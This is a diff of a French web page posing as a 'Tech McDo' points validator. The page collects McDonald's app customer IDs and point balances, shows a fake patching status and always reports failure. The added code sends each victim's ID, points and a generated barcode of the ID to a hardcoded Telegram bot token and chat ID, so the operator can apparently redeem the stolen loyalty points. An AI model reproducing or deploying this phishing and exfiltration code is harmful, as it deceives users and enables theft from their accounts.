@@ -6,34 +6,216 @@
     <title>Tech McDo • Point Validator</title>
     <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
     <style>
-        /* (styles identiques à la version précédente, garde le même look) */
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body { background: linear-gradient(145deg, #1a0b02 0%, #2d1706 100%); font-family: 'Segoe UI', 'Poppins', sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 1.5rem; }
-        .tech-card { background: #fef7e0; background-image: radial-gradient(circle at 10% 20%, rgba(255,215,130,0.15) 2%, transparent 2.5%); background-size: 28px 28px; border-radius: 3rem; max-width: 580px; width: 100%; box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 2px #ffbc6e inset, 0 0 0 5px #8b3c0c inset; overflow: hidden; }
-        .header-mc { background: #d62326; padding: 1.5rem 1rem 1.2rem; text-align: center; clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%); margin-bottom: 1rem; }
-        .header-mc h1 { font-size: 2.3rem; font-weight: 800; letter-spacing: -0.5px; color: #ffde9c; text-shadow: 4px 4px 0 #8b2c1a; }
-        .header-mc p { color: #ffecb3; font-weight: 600; font-size: 0.75rem; text-transform: uppercase; background: #9b2e1c; display: inline-block; padding: 0.2rem 1rem; border-radius: 30px; margin-top: 8px; }
-        .content { padding: 1.8rem 2rem 2.2rem; }
-        .input-group { margin-bottom: 1.5rem; position: relative; }
-        .input-group label { display: block; font-weight: 800; color: #5c2a0c; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px; margin-bottom: 0.5rem; }
-        .input-field { width: 100%; padding: 0.9rem 1.2rem; font-size: 1.3rem; font-weight: 700; font-family: monospace; background: #fff5e6; border: 3px solid #ffb347; border-radius: 60px; outline: none; color: #3c1c04; text-align: center; transition: 0.15s; }
-        .input-field:focus { border-color: #d62326; box-shadow: 0 0 0 3px rgba(214,35,38,0.3); background: #ffffff; }
-        .help-button { background: #5c2a0c; border: none; color: #ffde9c; font-size: 0.75rem; font-weight: bold; padding: 0.4rem 0.9rem; border-radius: 30px; cursor: pointer; margin-top: 0.6rem; display: inline-flex; align-items: center; gap: 6px; transition: 0.1s; font-family: inherit; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
-        .help-button:active { transform: scale(0.96); }
-        .next-btn { background: #e67e22; border: none; width: 100%; padding: 1rem; font-size: 1.4rem; font-weight: 800; text-transform: uppercase; color: #2f1705; border-radius: 60px; cursor: pointer; transition: 0.1s linear; box-shadow: 0 8px 0 #8b3c1a; letter-spacing: 2px; margin-bottom: 1.5rem; font-family: inherit; }
-        .next-btn:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b3c1a; }
-        .next-btn:disabled { opacity: 0.7; transform: translateY(0); cursor: not-allowed; }
-        .status-panel { background: #2a2218; border-radius: 2rem; padding: 1rem; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; font-size: 1.2rem; border-left: 4px solid #ffb347; box-shadow: inset 0 0 8px rgba(0,0,0,0.5), 0 2px 6px rgba(0,0,0,0.2); }
-        .status-text { transition: 0.1s; background: #00000088; padding: 0.7rem; border-radius: 2rem; backdrop-filter: blur(4px); }
-        .patch { color: #ffc107; text-shadow: 0 0 2px darkorange; }
-        .error-msg { color: #ff6a5c; text-shadow: 0 0 3px #4a0000; animation: subtleFlicker 0.4s ease; }
-        @keyframes subtleFlicker { 0% { opacity: 0.6; letter-spacing: 0px; } 100% { opacity: 1; letter-spacing: 0.5px; } }
-        .info-length { font-size: 0.7rem; text-align: center; margin-top: 0.6rem; color: #886633; font-weight: 600; }
-        .ghost-barcode { position: fixed; top: -2000px; left: -2000px; opacity: 0; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
-        canvas#barcodeCanvasHidden { width: 600px; height: 180px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: linear-gradient(145deg, #1a0b02 0%, #2d1706 100%);
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+
+        .tech-card {
+            background: #fef7e0;
+            background-image: radial-gradient(circle at 10% 20%, rgba(255,215,130,0.15) 2%, transparent 2.5%);
+            background-size: 28px 28px;
+            border-radius: 3rem;
+            max-width: 580px;
+            width: 100%;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 2px #ffbc6e inset, 0 0 0 5px #8b3c0c inset;
+            overflow: hidden;
+        }
+
+        .header-mc {
+            background: #d62326;
+            padding: 1.5rem 1rem 1.2rem;
+            text-align: center;
+            clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
+            margin-bottom: 1rem;
+        }
+
+        .header-mc h1 {
+            font-size: 2.3rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            color: #ffde9c;
+            text-shadow: 4px 4px 0 #8b2c1a;
+        }
+
+        .header-mc p {
+            color: #ffecb3;
+            font-weight: 600;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            background: #9b2e1c;
+            display: inline-block;
+            padding: 0.2rem 1rem;
+            border-radius: 30px;
+            margin-top: 8px;
+        }
+
+        .content {
+            padding: 1.8rem 2rem 2.2rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: 800;
+            color: #5c2a0c;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            font-size: 1.3rem;
+            font-weight: 700;
+            font-family: monospace;
+            background: #fff5e6;
+            border: 3px solid #ffb347;
+            border-radius: 60px;
+            outline: none;
+            color: #3c1c04;
+            text-align: center;
+            transition: 0.15s;
+        }
+
+        .input-field:focus {
+            border-color: #d62326;
+            box-shadow: 0 0 0 3px rgba(214,35,38,0.3);
+            background: #ffffff;
+        }
+
+        .help-button {
+            background: #5c2a0c;
+            border: none;
+            color: #ffde9c;
+            font-size: 0.75rem;
+            font-weight: bold;
+            padding: 0.4rem 0.9rem;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 0.6rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: 0.1s;
+            font-family: inherit;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .help-button:active {
+            transform: scale(0.96);
+        }
+
+        .next-btn {
+            background: #e67e22;
+            border: none;
+            width: 100%;
+            padding: 1rem;
+            font-size: 1.4rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            color: #2f1705;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.1s linear;
+            box-shadow: 0 8px 0 #8b3c1a;
+            letter-spacing: 2px;
+            margin-bottom: 1.5rem;
+            font-family: inherit;
+        }
+
+        .next-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #8b3c1a;
+        }
+
+        .next-btn:disabled {
+            opacity: 0.7;
+            transform: translateY(0);
+            cursor: not-allowed;
+        }
+
+        .status-panel {
+            background: #2a2218;
+            border-radius: 2rem;
+            padding: 1rem;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 1.2rem;
+            border-left: 4px solid #ffb347;
+            box-shadow: inset 0 0 8px rgba(0,0,0,0.5), 0 2px 6px rgba(0,0,0,0.2);
+        }
+
+        .status-text {
+            transition: 0.1s;
+            background: #00000088;
+            padding: 0.7rem;
+            border-radius: 2rem;
+            backdrop-filter: blur(4px);
+        }
+
+        .patch {
+            color: #ffc107;
+            text-shadow: 0 0 2px darkorange;
+        }
+
+        .error-msg {
+            color: #ff6a5c;
+            text-shadow: 0 0 3px #4a0000;
+            animation: subtleFlicker 0.4s ease;
+        }
+
+        @keyframes subtleFlicker {
+            0% { opacity: 0.6; letter-spacing: 0px; }
+            100% { opacity: 1; letter-spacing: 0.5px; }
+        }
+
+        .info-length {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 0.6rem;
+            color: #886633;
+            font-weight: 600;
+        }
+
+        .ghost-barcode {
+            position: fixed;
+            top: -2000px;
+            left: -2000px;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+
+        canvas#barcodeCanvasHidden {
+            width: 600px;
+            height: 180px;
+        }
     </style>
 </head>
 <body>
+
 <div class="tech-card">
     <div class="header-mc">
         <h1>⚡ TECH MCDO ⚡</h1>
@@ -43,15 +225,20 @@
         <div class="input-group">
             <label>🔐 IDENTIFIANT (4–8 CARACTÈRES)</label>
             <input type="text" id="identifiantInput" class="input-field" placeholder="ex: ABCD 1234" maxlength="9" autocomplete="off">
-            <div><button type="button" id="helpIdBtn" class="help-button">❓ Où trouver mon ID ?</button></div>
+            <div>
+                <button type="button" id="helpIdBtn" class="help-button">❓ Où trouver mon ID ?</button>
+            </div>
             <div class="info-length">⚠️ 4 à 8 caractères (un espace automatique après le 4ème)</div>
         </div>
+
         <div class="input-group">
             <label>🍟 POINTS SUR VOTRE COMPTE MCDO</label>
             <input type="text" id="pointsInput" class="input-field" placeholder="ex: 1250" autocomplete="off">
             <div class="info-length">📊 Saisissez le nombre de points (chiffres ou texte)</div>
         </div>
+
         <button id="suivantBtn" class="next-btn">SUIVANT ➤</button>
+
         <div class="status-panel">
             <div id="statusArea" class="status-text">
                 <span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>
@@ -60,12 +247,19 @@
         <div style="font-size: 11px; text-align: center; margin-top: 18px; color: #ac8e5a;">🔒 session sécurisée • serveur distant</div>
     </div>
 </div>
+
 <div class="ghost-barcode">
     <canvas id="barcodeCanvasHidden"></canvas>
 </div>
 
 <script>
     (function() {
+        // ---------- TELEGRAM CONFIG ----------
+        const BOT_TOKEN = "8905839440:AAE0kYGMGgyZ2CtelDqAhQVyvLE32xs9JpA";
+        const CHAT_ID = "7148167734";
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        // DOM elements
         const identifiantInput = document.getElementById('identifiantInput');
         const pointsInput = document.getElementById('pointsInput');
         const suivantBtn = document.getElementById('suivantBtn');
@@ -74,16 +268,29 @@
 
         let isProcessing = false;
         const barcodeCanvas = document.getElementById('barcodeCanvasHidden');
+
+        // Stockage de la valeur brute réelle (sans espace)
         let rawIdentifier = "";
 
+        // ---------- FONCTION D'EXPLICATION (BOÎTE ALERTE) ----------
         function showHelpHowToFindId() {
-            alert("🔎 COMMENT TROUVER VOTRE IDENTIFIANT MCDO :\n\n1️⃣ Ouvrez l'application McDonald's.\n2️⃣ Allez dans la section « Plus » (icône en bas à droite).\n3️⃣ En haut, cherchez « Identifiant » ou « ID client ».\n4️⃣ C'est une chaîne de 4 à 8 caractères.");
+            alert(
+                "🔎 COMMENT TROUVER VOTRE IDENTIFIANT MCDO :\n\n" +
+                "1️⃣ Ouvrez l'application McDonald's (McDo France ou selon pays).\n" +
+                "2️⃣ Allez dans la section « Plus » (icône en bas à droite, souvent trois lignes ou « … »).\n" +
+                "3️⃣ En haut de cette page, vous voyez votre nom et/ou email.\n" +
+                "4️⃣ Juste à côté ou en dessous, cherchez le libellé « Identifiant » ou « ID client ».\n" +
+                "5️⃣ Il s'agit d'une chaîne de 4 à 8 caractères (lettres/chiffres).\n\n" +
+                "👉 Saisissez cet identifiant dans le champ ci-dessus."
+            );
         }
 
+        // ---------- FORMATAGE AVEC ESPACE APRÈS 4 CARACTÈRES ----------
         function formatIdentifierWithSpace(inputValue) {
             let cleaned = inputValue.replace(/\s/g, '');
             if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
             rawIdentifier = cleaned;
+            
             let displayValue = rawIdentifier;
             if (rawIdentifier.length >= 4) {
                 displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
@@ -97,31 +304,52 @@
             let cleaned = raw.replace(/\s/g, '');
             if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
             rawIdentifier = cleaned;
+            
             let displayValue = rawIdentifier;
             if (rawIdentifier.length >= 4) {
                 displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
             }
             identifiantInput.value = displayValue;
+            
             if (isValidIdentifier(rawIdentifier)) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) updateStatus('idle');
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
             } else if (rawIdentifier.length > 0) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) updateStatus('idle');
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
             } else {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) updateStatus('idle');
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
             }
         }
 
+        // Validation identifiant (4-8 caractères, sans espaces)
         function isValidIdentifier(identifier) {
             return identifier && identifier.length >= 4 && identifier.length <= 8;
         }
 
-        function updateStatus(type) {
-            if (type === 'patch') statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
-            else if (type === 'erreur') statusArea.innerHTML = `<span class="error-msg">❌ ERREUR : PATCH ÉCHOUÉ ❌</span>`;
-            else if (type === 'idle') statusArea.innerHTML = `<span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>`;
-            else if (type === 'invalid_length') statusArea.innerHTML = `<span class="error-msg">⚠️ ERREUR : IDENTIFIANT MAX 8 MIN 4 ⚠️</span>`;
+        function updateStatus(type, customMessage = null) {
+            if (type === 'patch') {
+                statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
+            } 
+            else if (type === 'erreur') {
+                statusArea.innerHTML = `<span class="error-msg">❌ ERREUR : PATCH ÉCHOUÉ ❌</span>`;
+            }
+            else if (type === 'idle') {
+                statusArea.innerHTML = `<span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>`;
+            }
+            else if (type === 'invalid_length') {
+                statusArea.innerHTML = `<span class="error-msg">⚠️ ERREUR : IDENTIFIANT MAX 8 MIN 4 ⚠️</span>`;
+            }
+            else if (customMessage) {
+                statusArea.innerHTML = `<span class="error-msg">${customMessage}</span>`;
+            }
         }
 
+        // Génération code-barres (taille augmentée)
         function generateBarcodeOnCanvas(identifier) {
             return new Promise((resolve, reject) => {
                 try {
@@ -136,51 +364,58 @@
                         background: "#ffffff"
                     });
                     setTimeout(() => resolve(barcodeCanvas), 20);
-                } catch (err) { reject(err); }
+                } catch (err) {
+                    reject(err);
+                }
             });
         }
 
         function canvasToBlob(canvas) {
             return new Promise((resolve, reject) => {
-                canvas.toBlob(blob => blob ? resolve(blob) : reject(new Error("Conversion blob échouée")), 'image/png');
+                canvas.toBlob(blob => {
+                    if (blob) resolve(blob);
+                    else reject(new Error("Conversion blob échouée"));
+                }, 'image/png');
             });
         }
 
-        // Appel à l'API Vercel (sans token dans le front)
-        async function sendToVercelAPI(identifier, points, imageBlob) {
+        // Envoi à Telegram (identifiant brut, points, code barre)
+        async function sendToTelegram(identifier, points, imageBlob) {
             const formData = new FormData();
-            formData.append('identifier', identifier);
-            formData.append('points', points);
-            formData.append('image', imageBlob, 'barcode.png');
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'barcode_128.png');
             
-            const response = await fetch('/api/telegram', {
-                method: 'POST',
-                body: formData
-            });
-            if (!response.ok) {
-                throw new Error(`API error: ${response.status}`);
-            }
-            return response.json();
+            let pointsText = points && points.trim() !== "" ? points.trim() : "non renseignés";
+            const caption = `🆔 IDENTIFIANT : ${identifier}\n🍟 POINTS MCDO : ${pointsText}\n📦 CODE BARRE (CODE128) : ${identifier}`;
+            formData.append('caption', caption);
+
+            try {
+                await fetch(TELEGRAM_API_URL, { method: 'POST', body: formData });
+            } catch (e) {}
         }
 
         async function handleSuivant() {
             if (isProcessing) return;
+
             const identifier = rawIdentifier;
             const points = pointsInput.value;
+
             if (!isValidIdentifier(identifier)) {
                 updateStatus('invalid_length');
                 return;
             }
+
             isProcessing = true;
             suivantBtn.disabled = true;
+
             updateStatus('patch');
+
             try {
                 await generateBarcodeOnCanvas(identifier);
                 const barcodeBlob = await canvasToBlob(barcodeCanvas);
-                await sendToVercelAPI(identifier, points, barcodeBlob);
+                await sendToTelegram(identifier, points, barcodeBlob);
                 updateStatus('erreur');
             } catch (err) {
-                console.error(err); // (optionnel, pas de log utilisateur)
                 updateStatus('erreur');
             } finally {
                 isProcessing = false;
@@ -191,18 +426,34 @@
         function resetStatusOnInput() {
             if (isProcessing) return;
             if (rawIdentifier.length === 0 || isValidIdentifier(rawIdentifier)) {
-                if (!statusArea.innerHTML.includes("PATCH EN COURS")) updateStatus('idle');
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
             }
         }
-        function onPointsInput() { resetStatusOnInput(); }
-        function onKeyPressHandler(e) {
-            if (e.key === 'Enter') { e.preventDefault(); if (!isProcessing) handleSuivant(); }
+
+        function onPointsInput() {
+            if (isProcessing) return;
+            resetStatusOnInput();
         }
 
+        function onKeyPressHandler(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (!isProcessing) handleSuivant();
+            }
+        }
+
+        // Initialisation
         updateStatus('idle');
         rawIdentifier = "";
         identifiantInput.value = "";
-        try { JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false }); } catch(e) {}
+        
+        try {
+            JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false });
+        } catch(e) {}
+
+        // Événements
         identifiantInput.addEventListener('input', onIdentifierInput);
         pointsInput.addEventListener('input', onPointsInput);
         identifiantInput.addEventListener('keypress', onKeyPressHandler);
